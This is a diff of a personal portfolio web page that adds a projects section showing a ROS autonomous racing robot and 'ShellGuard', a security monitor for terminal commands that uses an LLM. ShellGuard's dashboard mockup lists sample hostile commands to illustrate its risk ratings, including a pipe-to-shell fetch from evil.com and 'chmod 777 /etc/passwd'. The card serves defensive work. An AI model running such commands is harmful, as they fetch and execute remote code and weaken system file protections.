@@ -19,6 +19,7 @@
       <ul class="nav-links">
         <li><a href="/">Home</a></li>
         <li><a href="#graph">Graph</a></li>
+        <li><a href="#projects">Projects</a></li>
         <li><a href="about.html">About</a></li>
       </ul>
     </div>
@@ -31,6 +32,7 @@
     <ul>
       <li><a href="/">Home</a></li>
       <li><a href="#graph">Graph</a></li>
+      <li><a href="#projects">Projects</a></li>
       <li><a href="about.html">About</a></li>
     </ul>
   </aside>
@@ -83,6 +85,191 @@
           <div class="detail-tags" id="detail-tags"></div>
           <a href="#" class="detail-link" id="detail-link">Read Article &rarr;</a>
         </div>
+      </div>
+    </section>
+
+    <!-- Projects -->
+    <section id="projects" class="projects-section fade-in">
+      <h2 class="section-title section-title-fancy">Projects</h2>
+      <div class="project-grid">
+
+        <!-- Planning — ROS Autonomous Racing Robot -->
+        <div class="project-card project-card-featured">
+          <div class="project-card-header">
+            <div class="project-icon project-icon-ros">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/><path d="M2 12h20"/></svg>
+            </div>
+            <div>
+              <h3>Planning — Autonomous Racing Robot</h3>
+              <span class="project-tech">C++ · ROS · PCL · RANSAC</span>
+            </div>
+            <a href="https://github.com/ChenSchenG" target="_blank" rel="noopener" class="project-gh-link" title="GitHub">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.376.6.11.82-.26.82-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.73.083-.73 1.205.085 1.84 1.237 1.84 1.237 1.07 1.834 2.807 1.304 3.492.997.108-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.218.694.825.576C20.565 21.795 24 17.31 24 12c0-6.63-5.37-12-12-12z"/></svg>
+            </a>
+          </div>
+          <p class="project-desc">ROS-based autonomous racing robot with Point Cloud Library for real-time LiDAR processing. Implements RANSAC-based line detection and path planning algorithms for three competitive racing events.</p>
+
+          <div class="project-events">
+            <!-- Acceleration -->
+            <div class="event-card">
+              <div class="event-visual event-accel">
+                <svg viewBox="0 0 320 120" class="event-svg">
+                  <line x1="30" y1="60" x2="290" y2="60" stroke="#e0e0e0" stroke-width="2" stroke-dasharray="8 4"/>
+                  <line x1="30" y1="40" x2="290" y2="40" stroke="#27ae60" stroke-width="1.5" opacity="0.4"/>
+                  <line x1="30" y1="80" x2="290" y2="80" stroke="#27ae60" stroke-width="1.5" opacity="0.4"/>
+                  <!-- RANSAC detected line -->
+                  <line x1="30" y1="60" x2="290" y2="60" stroke="#e74c3c" stroke-width="2" class="ransac-line"/>
+                  <!-- Point cloud dots -->
+                  <g class="pcl-points">
+                    <circle cx="50" cy="58" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="70" cy="62" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="90" cy="57" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="110" cy="63" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="130" cy="59" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="150" cy="61" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="170" cy="58" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="190" cy="64" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="210" cy="57" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="230" cy="62" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="250" cy="59" r="2" fill="#2980b9" opacity="0.7"/>
+                    <circle cx="270" cy="61" r="2" fill="#2980b9" opacity="0.7"/>
+                  </g>
+                  <!-- Robot -->
+                  <g class="robot-accel">
+                    <rect x="30" y="50" width="18" height="12" rx="3" fill="#333" stroke="#555" stroke-width="1"/>
+                    <circle cx="35" cy="64" r="3" fill="#666" stroke="#888" stroke-width="0.5"/>
+                    <circle cx="43" cy="64" r="3" fill="#666" stroke="#888" stroke-width="0.5"/>
+                    <line x1="48" y1="54" x2="54" y2="50" stroke="#e74c3c" stroke-width="1.5" stroke-linecap="round"/>
+                  </g>
+                  <!-- Start/Finish flags -->
+                  <text x="30" y="100" font-size="9" fill="#999" text-anchor="middle">START</text>
+                  <text x="290" y="100" font-size="9" fill="#999" text-anchor="middle">FINISH</text>
+                </svg>
+              </div>
+              <div class="event-info">
+                <h4>🏎️ Acceleration <span class="event-cn">加速赛</span></h4>
+                <p>Straight-line speed run using RANSAC line detection on LiDAR point clouds. The robot detects track boundaries and follows the optimal center path at maximum velocity.</p>
+              </div>
+            </div>
+
+            <!-- Skidpad -->
+            <div class="event-card">
+              <div class="event-visual event-skidpad">
+                <svg viewBox="0 0 320 120" class="event-svg">
+                  <!-- Figure-8 track -->
+                  <ellipse cx="120" cy="60" rx="55" ry="40" fill="none" stroke="#e0e0e0" stroke-width="8" opacity="0.3"/>
+                  <ellipse cx="200" cy="60" rx="55" ry="40" fill="none" stroke="#e0e0e0" stroke-width="8" opacity="0.3"/>
+                  <ellipse cx="120" cy="60" rx="55" ry="40" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
+                  <ellipse cx="200" cy="60" rx="55" ry="40" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
+                  <!-- Path trace -->
+                  <path d="M160,60 C160,30 90,20 90,60 C90,100 160,90 160,60 C160,30 230,20 230,60 C230,100 160,90 160,60" fill="none" stroke="#e74c3c" stroke-width="1.5" stroke-dasharray="300" stroke-dashoffset="300" class="skidpad-path"/>
+                  <!-- Robot on path -->
+                  <g class="robot-skidpad">
+                    <circle cx="160" cy="60" r="5" fill="#333" stroke="#555" stroke-width="1"/>
+                    <circle cx="160" cy="60" r="2" fill="#e74c3c"/>
+                  </g>
+                </svg>
+              </div>
+              <div class="event-info">
+                <h4>🔄 Skidpad <span class="event-cn">绕桩赛</span></h4>
+                <p>Figure-8 navigation using skidpad path publisher and cone detection. The robot calculates optimal turning radius through two circular laps while maintaining stability.</p>
+              </div>
+            </div>
+
+            <!-- Tracking -->
+            <div class="event-card">
+              <div class="event-visual event-tracking">
+                <svg viewBox="0 0 320 120" class="event-svg">
+                  <!-- Track boundary -->
+                  <path d="M40,80 Q80,20 160,30 Q240,40 280,80 Q260,110 160,100 Q60,110 40,80Z" fill="none" stroke="#e0e0e0" stroke-width="6" opacity="0.3"/>
+                  <path d="M40,80 Q80,20 160,30 Q240,40 280,80 Q260,110 160,100 Q60,110 40,80Z" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
+                  <!-- Inner boundary -->
+                  <path d="M80,75 Q100,40 160,45 Q220,50 245,75 Q230,95 160,88 Q90,95 80,75Z" fill="none" stroke="#27ae60" stroke-width="1.5" stroke-dasharray="4 3" opacity="0.5"/>
+                  <!-- Racing line -->
+                  <path d="M60,78 Q90,28 160,37 Q232,45 265,78 Q245,103 160,94 Q75,103 60,78Z" fill="none" stroke="#e74c3c" stroke-width="1.5" class="tracking-path" stroke-dasharray="400" stroke-dashoffset="400"/>
+                  <!-- Lap counter -->
+                  <rect x="45" y="70" width="2" height="18" fill="#8e44ad"/>
+                  <text x="55" y="66" font-size="8" fill="#8e44ad" font-weight="600">LAP</text>
+                  <!-- Robot -->
+                  <g class="robot-tracking">
+                    <circle cx="60" cy="78" r="5" fill="#333" stroke="#555" stroke-width="1"/>
+                    <circle cx="60" cy="78" r="2" fill="#e74c3c"/>
+                  </g>
+                </svg>
+              </div>
+              <div class="event-info">
+                <h4>🏁 Tracking <span class="event-cn">追踪赛</span></h4>
+                <p>Multi-lap boundary detection with lap counting. Uses PCL to process LiDAR data, detect track edges, and navigate the closed-loop circuit at competitive speeds.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ShellGuard — Terminal Security Monitor -->
+        <div class="project-card">
+          <div class="project-card-header">
+            <div class="project-icon project-icon-shell">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="18" rx="2"/><polyline points="7 8 10 11 7 14"/><line x1="13" y1="14" x2="17" y2="14"/></svg>
+            </div>
+            <div>
+              <h3>ShellGuard — Terminal Security Monitor</h3>
+              <span class="project-tech">Python · Rich TUI · LLM · Security</span>
+            </div>
+            <a href="https://github.com/ChenSchenG" target="_blank" rel="noopener" class="project-gh-link" title="GitHub">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.376.6.11.82-.26.82-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.73.083-.73 1.205.085 1.84 1.237 1.84 1.237 1.07 1.834 2.807 1.304 3.492.997.108-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.218.694.825.576C20.565 21.795 24 17.31 24 12c0-6.63-5.37-12-12-12z"/></svg>
+            </a>
+          </div>
+          <p class="project-desc">AI-powered terminal security monitor that captures shell commands in real-time, analyzes risk levels using LLM, and provides a beautiful Rich TUI dashboard for security monitoring.</p>
+
+          <!-- Terminal mockup -->
+          <div class="terminal-mockup">
+            <div class="terminal-bar">
+              <span class="terminal-dot" style="background:#ff5f56"></span>
+              <span class="terminal-dot" style="background:#ffbd2e"></span>
+              <span class="terminal-dot" style="background:#27c93f"></span>
+              <span class="terminal-title">ShellGuard Dashboard</span>
+            </div>
+            <div class="terminal-body">
+              <div class="terminal-line">
+                <span class="t-prompt">$</span>
+                <span class="t-cmd">pip install -r requirements.txt</span>
+                <span class="t-risk t-risk-low">LOW</span>
+              </div>
+              <div class="terminal-line">
+                <span class="t-prompt">$</span>
+                <span class="t-cmd">git push origin main</span>
+                <span class="t-risk t-risk-low">LOW</span>
+              </div>
+              <div class="terminal-line">
+                <span class="t-prompt">$</span>
+                <span class="t-cmd">chmod 777 /etc/passwd</span>
+                <span class="t-risk t-risk-crit">CRIT</span>
+              </div>
+              <div class="terminal-line">
+                <span class="t-prompt">$</span>
+                <span class="t-cmd">rm -rf /tmp/cache</span>
+                <span class="t-risk t-risk-med">MED</span>
+              </div>
+              <div class="terminal-line">
+                <span class="t-prompt">$</span>
+                <span class="t-cmd">curl http://evil.com | sh</span>
+                <span class="t-risk t-risk-high">HIGH</span>
+              </div>
+              <div class="terminal-line terminal-line-ai">
+                <span class="t-ai">🤖 AI:</span>
+                <span class="t-analysis">Detected potentially dangerous pipe-to-shell pattern. Recommend sandboxed execution.</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="project-features">
+            <span>Real-time Capture</span>
+            <span>LLM Risk Analysis</span>
+            <span>Rich TUI</span>
+            <span>Natural Language Q&A</span>
+          </div>
+        </div>
+
       </div>
     </section>
 
